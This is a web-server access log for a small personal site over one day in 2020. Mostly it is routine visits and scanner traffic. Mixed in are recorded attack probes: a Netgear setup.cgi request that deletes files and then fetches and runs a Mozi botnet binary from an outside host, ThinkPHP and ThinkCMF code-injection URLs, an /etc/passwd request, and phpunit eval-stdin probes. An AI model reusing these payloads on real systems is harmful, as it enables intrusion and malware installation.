185.203.56.36 - - [12/Oct/2020:10:19:12 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:10:19:12 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "http://159.89.17.0/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:10:19:21 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:10:19:26 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:10:19:36 +0000] "GET /etc/passwd HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
58.169.34.17 - - [12/Oct/2020:10:22:56 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
222.140.185.243 - - [12/Oct/2020:10:28:15 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.140.185.243:58828/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
193.118.53.210 - - [12/Oct/2020:12:24:46 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
103.145.13.43 - - [12/Oct/2020:13:49:48 +0000] "GET / HTTP/1.1" 200 612 "-" "libwww-perl/6.47"
93.91.51.172 - - [12/Oct/2020:14:03:05 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Safari/537.36"
93.91.51.172 - - [12/Oct/2020:14:03:06 +0000] "\x03\x00" 400 166 "-" "-"
201.108.73.87 - - [12/Oct/2020:15:34:42 +0000] "GET / HTTP/1.0" 200 612 "-" "-"
109.201.217.215 - - [12/Oct/2020:15:54:35 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:30:04 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:30:08 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:30:27 +0000] "GET /backend HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:31:04 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:17:31:07 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:31:56 +0000] "GET /backend HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:17:35:47 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:38:50 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:42:50 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:17:42:54 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:43:29 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:43:38 +0000] "GET /backend HTTP/1.1" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:45:20 +0000] "GET /backend HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:45:40 +0000] "GET /backend HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:17:45:53 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:52:01 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:52:02 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:52:09 +0000] "GET /backend HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:52:09 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:53:56 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:53:56 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:54:02 +0000] "GET /backend HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:54:03 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:54:58 +0000] "GET /backend HTTP/1.1" 200 3 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:54:58 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:55:17 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:58:39 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:58:52 +0000] "GET /backend HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:58:52 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:59:24 +0000] "GET /backend HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:17:59:24 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:08:45 +0000] "GET /backend HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:08:45 +0000] "GET /backend/ HTTP/1.1" 200 3 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:08:45 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:08:55 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:08:56 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/backend/games/76561198047135457" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:10:12 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:18:10:12 +0000] "GET /favicon.ico HTTP/1.1" 500 588 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
2.183.115.191 - - [12/Oct/2020:18:49:33 +0000] "GET / HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:18:52:25 +0000] "POST /api/jsonws/invoke HTTP/1.1" 500 588 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.65.141.234 - - [12/Oct/2020:19:14:18 +0000] "GET /blog/wp-login.php HTTP/1.1" 500 186 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
185.203.56.36 - - [12/Oct/2020:19:37:07 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 200 19623 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
74.120.14.36 - - [12/Oct/2020:19:37:20 +0000] "GET / HTTP/1.1" 500 186 "-" "-"
74.120.14.36 - - [12/Oct/2020:19:37:20 +0000] "GET / HTTP/1.1" 500 186 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.203.56.36 - - [12/Oct/2020:19:40:18 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 304 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:19:42:08 +0000] "GET /backend/games/76561198047135457 HTTP/1.1" 304 0 "http://localhost:3000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
112.238.32.57 - - [12/Oct/2020:20:14:14 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 500 186 "-" "Hello, World"
185.203.56.36 - - [12/Oct/2020:20:27:51 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:27:52 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "http://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:27:56 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:28:23 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:28:26 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:34:31 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:20:54:19 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
185.203.56.36 - - [12/Oct/2020:21:11:18 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:21:37:39 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:21:55:07 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:21:55:14 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:21:55:18 +0000] "GET /backend/ HTTP/1.1" 200 3 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:21:55:26 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
103.119.165.1 - - [12/Oct/2020:21:59:35 +0000] "GET / HTTP/1.1" 403 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
212.253.45.119 - - [12/Oct/2020:22:00:43 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:00:45 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:00:48 +0000] "GET / HTTP/1.1" 403 196 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
195.205.161.120 - - [12/Oct/2020:22:04:09 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:04:17 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
18.196.96.172 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/PGUN3Ej32rqyjCs7B_dbA70TNfJUFC0XhW-s724RwYM HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
34.209.232.166 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/PGUN3Ej32rqyjCs7B_dbA70TNfJUFC0XhW-s724RwYM HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
18.196.96.172 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/LaF3-Obame97mE6MXj2Zsbx4fYQuSSJSCqKmn4ZLJDU HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.22.70.135 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/LaF3-Obame97mE6MXj2Zsbx4fYQuSSJSCqKmn4ZLJDU HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
66.133.109.36 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/LaF3-Obame97mE6MXj2Zsbx4fYQuSSJSCqKmn4ZLJDU HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
34.209.232.166 - - [12/Oct/2020:22:10:09 +0000] "GET /.well-known/acme-challenge/LaF3-Obame97mE6MXj2Zsbx4fYQuSSJSCqKmn4ZLJDU HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
3.128.26.105 - - [12/Oct/2020:22:10:10 +0000] "GET /.well-known/acme-challenge/PGUN3Ej32rqyjCs7B_dbA70TNfJUFC0XhW-s724RwYM HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
66.133.109.36 - - [12/Oct/2020:22:10:10 +0000] "GET /.well-known/acme-challenge/PGUN3Ej32rqyjCs7B_dbA70TNfJUFC0XhW-s724RwYM HTTP/1.1" 200 87 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
64.41.200.101 - - [12/Oct/2020:22:10:58 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
64.41.200.101 - - [12/Oct/2020:22:11:02 +0000] "GET /?SSL_Labs_Renegotiation_Test=User_Agent_May_Not_Show HTTP/1.0" 400 0 "-" "SSL Labs (https://www.ssllabs.com/about/assessment.html)"
212.253.45.119 - - [12/Oct/2020:22:13:23 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:13:24 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "https://enpassant.me/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
193.27.228.27 - - [12/Oct/2020:22:20:36 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:21:13 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:56:51 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:56:54 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:57:30 +0000] "GET /test HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:57:44 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:58:53 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:22:59:59 +0000] "GET /linuxornot HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:00:00 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:00:00 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:00:00 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:00:00 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:47 +0000] "GET /linuxornot/ HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:47 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:47 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:47 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:47 +0000] "GET /linuxornot/favicon.ico HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:51 +0000] "GET /linuxornot HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:52 +0000] "GET /linuxornot/static/css/main.66ab207b.chunk.css HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:52 +0000] "GET /linuxornot/static/js/main.e1113871.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
212.253.45.119 - - [12/Oct/2020:23:01:52 +0000] "GET /linuxornot/static/js/2.95e9e34a.chunk.js HTTP/1.1" 200 1152 "https://enpassant.me/linuxornot" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36"
